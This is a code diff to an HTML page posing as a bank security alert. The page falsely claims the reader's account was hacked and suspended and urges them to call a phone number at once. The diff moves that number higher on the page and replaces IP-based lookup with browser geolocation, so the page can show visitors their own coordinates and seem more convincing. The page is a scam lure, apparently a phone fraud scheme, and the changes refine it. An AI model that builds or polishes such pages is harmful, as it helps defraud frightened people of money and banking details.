@@ -139,14 +139,13 @@
         We have detected suspicious activity on your banking account that may indicate unauthorized access to your financial information. Hackers may have attempted to access your personal and banking details, including account numbers, transaction history, and other sensitive data.
       </p>
       
-   
+      <!-- First Phone Number (Centered) -->
+      <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
 
       <p class="alert-message">
         For your security, we have temporarily suspended access to your online banking account to prevent any unauthorized transactions or further risks. To resolve this issue and protect your financial information, please contact our support team immediately.
       </p>
-   <!-- First Phone Number (Centered) -->
-      <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
-      
+
       <p class="alert-message">
         <strong>Important:</strong> Failure to act promptly may result in potential unauthorized withdrawals or misuse of your account.
       </p>
@@ -154,9 +153,9 @@
         <strong>Do not attempt to log in from this IP address</strong> as it may be associated with unauthorized activity. Access from this location has been flagged for your protection.
       </p>
 
-      <!-- Dynamic IP Address and Location -->
+      <!-- Dynamic IP Address and Location using Geolocation -->
       <p class="alert-message" id="location-message">
-        Your IP address <strong id="user-ip"></strong> is being detected from <strong id="user-location">loading...</strong>.
+        Your current location is being fetched...
       </p>
 
       <!-- Support Message -->
@@ -168,32 +167,19 @@
       <a href="tel:+18282836253" class="phone-number">+1-828-283-6253</a>
     </footer>
 
-    <!-- Script to fetch IP and location -->
+    <!-- Script to fetch IP and location using Geolocation API -->
     <script>
-      // Fetch user's IP and location
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const userIP = data.ip;
-          document.getElementById('user-ip').textContent = userIP;
-
-          // Use ipstack or ipinfo to get geolocation info based on IP
-          fetch(`https://ipinfo.io/${userIP}/json?token=YOUR_API_KEY`)
-            .then(response => response.json())
-            .then(locationData => {
-              const location = locationData.city + ', ' + locationData.region + ', ' + locationData.country;
-              document.getElementById('user-location').textContent = location;
-            })
-            .catch(err => {
-              console.error("Location fetch error:", err);
-              document.getElementById('user-location').textContent = 'Unknown';
-            });
-        })
-        .catch(err => {
-          console.error("IP fetch error:", err);
-          document.getElementById('user-ip').textContent = 'Unknown';
-          document.getElementById('user-location').textContent = 'Unknown';
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          document.getElementById('location-message').textContent = `Your current location: Latitude ${lat}, Longitude ${lon}.`;
+        }, function(error) {
+          document.getElementById('location-message').textContent = 'Unable to retrieve location. Please allow location access or try again later.';
         });
+      } else {
+        document.getElementById('location-message').textContent = 'Geolocation is not supported by this browser.';
+      }
     </script>
 
   </body>
